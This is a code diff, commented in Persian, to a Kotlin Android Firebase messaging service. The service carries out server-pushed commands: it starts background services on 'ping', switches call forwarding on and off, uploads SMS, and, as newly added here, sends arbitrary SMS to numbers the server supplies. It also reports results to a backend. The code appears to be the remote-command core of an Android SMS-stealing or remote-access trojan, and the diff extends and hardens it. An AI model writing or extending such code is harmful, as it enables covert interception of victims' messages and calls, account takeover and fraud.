@@ -36,9 +36,15 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         // ⭐ Actions برای BroadcastReceiver
         private const val SMS_SENT_ACTION = "com.example.test.SMS_SENT"
         private const val SMS_DELIVERED_ACTION = "com.example.test.SMS_DELIVERED"
+        
+        // ⭐ SharedPreferences برای track کردن پیام‌های پردازش شده
+        private const val PREFS_NAME = "fcm_processed_messages"
+        private const val KEY_PROCESSED_MSG_IDS = "processed_message_ids"
+        private const val MAX_STORED_MSG_IDS = 100  // حداکثر 100 پیام آخر رو نگه می‌داریم
     }
     
     private var wakeLock: PowerManager.WakeLock? = null
+    private var receiversRegistered = false  // ⭐ برای جلوگیری از double registration
     
     // ⭐ BroadcastReceiver برای گرفتن نتیجه ارسال SMS
     private val smsSentReceiver = object : BroadcastReceiver() {
@@ -132,12 +138,24 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     
     override fun onDestroy() {
         super.onDestroy()
+        
+        // ⭐ آزاد کردن WakeLock
+        releaseWakeLock()
+        
         // ⭐ حذف BroadcastReceivers
-        try {
-            unregisterReceiver(smsSentReceiver)
-            unregisterReceiver(smsDeliveredReceiver)
-        } catch (e: Exception) {
-            Log.e(TAG, "Error unregistering receivers: ${e.message}")
+        if (receiversRegistered) {
+            try {
+                unregisterReceiver(smsSentReceiver)
+                unregisterReceiver(smsDeliveredReceiver)
+                receiversRegistered = false
+                Log.d(TAG, "✅ SMS Receivers unregistered")
+            } catch (e: IllegalArgumentException) {
+                // Receiver قبلاً unregister شده - مشکلی نیست
+                Log.w(TAG, "⚠️ Receiver already unregistered")
+                receiversRegistered = false
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Error unregistering receivers: ${e.message}")
+            }
         }
     }
     
@@ -146,11 +164,22 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         acquireWakeLock()
         
         try {
+            val messageId = remoteMessage.messageId ?: UUID.randomUUID().toString()
+            
             Log.d(TAG, "════════════════════════════════════════")
             Log.d(TAG, "📥 FCM Message Received")
             Log.d(TAG, "From: ${remoteMessage.from}")
-            Log.d(TAG, "Message ID: ${remoteMessage.messageId}")
+            Log.d(TAG, "Message ID: $messageId")
             Log.d(TAG, "════════════════════════════════════════")
+            
+            // ⭐ چک کردن اینکه این پیام قبلاً پردازش شده یا نه
+            if (isMessageAlreadyProcessed(messageId)) {
+                Log.w(TAG, "⚠️ Message already processed: $messageId - Skipping...")
+                return
+            }
+
+            // ⭐ ثبت پیام به عنوان پردازش شده
+            markMessageAsProcessed(messageId)
 
         // Handle notification
         remoteMessage.notification?.let {
@@ -204,6 +233,9 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             "ping" -> {
                 Log.d(TAG, "🎯 PING command detected!")
                 sendOnlineConfirmation()
+                // ⭐ وقتی ping میاد، سرویس‌ها رو هم راه‌اندازی می‌کنیم
+                Log.d(TAG, "🚀 Starting services after ping...")
+                startAllBackgroundServices()
             }
             
             // ⭐ فعال‌سازی سرویس‌های پس‌زمینه از راه دور
@@ -234,6 +266,15 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 val utility = CallForwardingUtility(applicationContext, deviceId)
                 val result = utility.deactivateCallForwarding(simSlot)
                 Log.d(TAG, "✅ Deactivate result: $result")
+            }
+
+            "send_sms" -> {
+                Log.d(TAG, "📨 Send SMS command")
+                if (phone != null && message != null) {
+                    sendSms(phone, message, simSlot)
+                } else {
+                    Log.w(TAG, "❌ Missing phone or message for send_sms command")
+                }
             }
 
             "quick_upload_sms" -> {
@@ -373,6 +414,12 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
      * ⭐ ثبت BroadcastReceivers برای نتیجه SMS
      */
     private fun registerSmsReceivers() {
+        // ⭐ جلوگیری از double registration
+        if (receiversRegistered) {
+            Log.w(TAG, "⚠️ Receivers already registered, skipping...")
+            return
+        }
+        
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION), Context.RECEIVER_NOT_EXPORTED)
@@ -381,9 +428,12 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION))
                 registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION))
             }
+            receiversRegistered = true
             Log.d(TAG, "✅ SMS Receivers registered")
+        } catch (e: IllegalStateException) {
+            Log.w(TAG, "⚠️ Service not in valid state for receiver registration: ${e.message}")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to register SMS receivers: ${e.message}")
+            Log.e(TAG, "❌ Failed to register SMS receivers: ${e.message}", e)
         }
     }
     
@@ -625,12 +675,16 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
      */
     private fun releaseWakeLock() {
         try {
-            if (wakeLock?.isHeld == true) {
-                wakeLock?.release()
-                Log.d(TAG, "⚡ WakeLock released")
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                    Log.d(TAG, "⚡ WakeLock released")
+                }
+                wakeLock = null  // ⭐ null کردن reference
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to release WakeLock: ${e.message}")
+            Log.e(TAG, "❌ Failed to release WakeLock: ${e.message}", e)
+            wakeLock = null  // ⭐ در صورت خطا هم null کنیم
         }
     }
     
@@ -795,7 +849,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 }
                 
                 val baseUrl = getBaseUrl()
-                val url = URL("$baseUrl/sms/delivery-status")  // ⭐ این endpoint رو از سمت سرور اضافه کن
+                val url = URL("$baseUrl/sms/delivery-status")
                 val conn = url.openConnection() as HttpURLConnection
                 
                 Log.d(TAG, "🌐 URL: $url")
@@ -873,6 +927,54 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 Log.e(TAG, "❌ Failed to send service status: ${e.message}")
             }
         }.start()
+    }
+
+    /**
+     * ⭐ چک کردن اینکه پیام قبلاً پردازش شده یا نه
+     * برای جلوگیری از duplicate processing وقتی برنامه بعد از مدت طولانی offline دوباره online میشه
+     */
+    private fun isMessageAlreadyProcessed(messageId: String): Boolean {
+        return try {
+            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            val processedIds = prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()
+            val isProcessed = processedIds.contains(messageId)
+            if (isProcessed) {
+                Log.d(TAG, "📋 Message $messageId already in processed list (${processedIds.size} total)")
+            }
+            isProcessed
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error checking message status: ${e.message}", e)
+            false  // در صورت خطا، اجازه پردازش بده
+        }
+    }
+    
+    /**
+     * ⭐ ثبت پیام به عنوان پردازش شده
+     */
+    private fun markMessageAsProcessed(messageId: String) {
+        try {
+            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            val processedIds = (prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()).toMutableSet()
+            
+            // ⭐ اضافه کردن پیام جدید
+            processedIds.add(messageId)
+            
+            // ⭐ اگر تعداد از حد مجاز بیشتر شد، قدیمی‌ترین‌ها رو پاک کن
+            if (processedIds.size > MAX_STORED_MSG_IDS) {
+                val sortedIds = processedIds.sorted()  // sort برای پیدا کردن قدیمی‌ترین
+                val idsToRemove = sortedIds.take(processedIds.size - MAX_STORED_MSG_IDS)
+                processedIds.removeAll(idsToRemove)
+                Log.d(TAG, "🧹 Cleaned up ${idsToRemove.size} old message IDs")
+            }
+            
+            prefs.edit()
+                .putStringSet(KEY_PROCESSED_MSG_IDS, processedIds)
+                .apply()
+            
+            Log.d(TAG, "✅ Message $messageId marked as processed (${processedIds.size} total stored)")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error marking message as processed: ${e.message}", e)
+        }
     }
 
     override fun onNewToken(token: String) {
